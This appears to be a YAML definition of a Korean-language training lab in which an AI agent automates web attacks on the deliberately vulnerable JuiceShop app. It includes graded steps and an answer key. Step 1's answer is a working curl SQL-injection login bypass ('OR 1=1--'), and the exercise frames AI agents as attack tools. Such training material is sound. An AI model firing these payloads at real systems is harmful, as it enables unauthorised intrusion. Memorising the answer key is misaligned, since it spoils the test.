lab_id: attack-ai-week04
title: 웹 애플리케이션 공격 (Web App Attacks) - AI 지원
version: ai
course: attack-ai
week: 4
description: AI 에이전트를 활용하여 SQL Injection, XSS 등 웹 공격을 자동화한다. AI가 페이로드를 생성하고, 공격 결과를
  분석하여 취약점의 심각도를 평가한다.
difficulty: medium
duration_minutes: 120
objectives:
- AI를 사용한 자동 SQL Injection 공격을 수행한다
- AI가 XSS 페이로드를 생성하고 테스트하는 과정을 학습한다
- AI 기반 웹 공격의 장점과 한계를 이해한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: AI에게 JuiceShop 로그인에 SQLi를 시도하도록 요청하라.
  hint: SQLi 자동 공격
  category: exploit
  points: 10
  answer: 'curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
    application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'''
  answer_detail: AI가 이 작업을 자동화하여 수동 대비 효율과 일관성을 높인다. CCC 증적 시스템에 결과가 자동 기록된다.
  script: ai_sqli_login.py
  verify:
    type: output_contains
    expect: result
    field: stdout
- order: 2
  instruction: AI에게 JWT 토큰을 디코딩하고 분석하도록 요청하라.
  hint: JWT 자동 분석
  category: analysis
  points: 10
  answer: python3 -c "import base64,json; ...decode JWT..."
  answer_detail: AI가 이 작업을 자동화하여 수동 대비 효율과 일관성을 높인다. CCC 증적 시스템에 결과가 자동 기록된다.
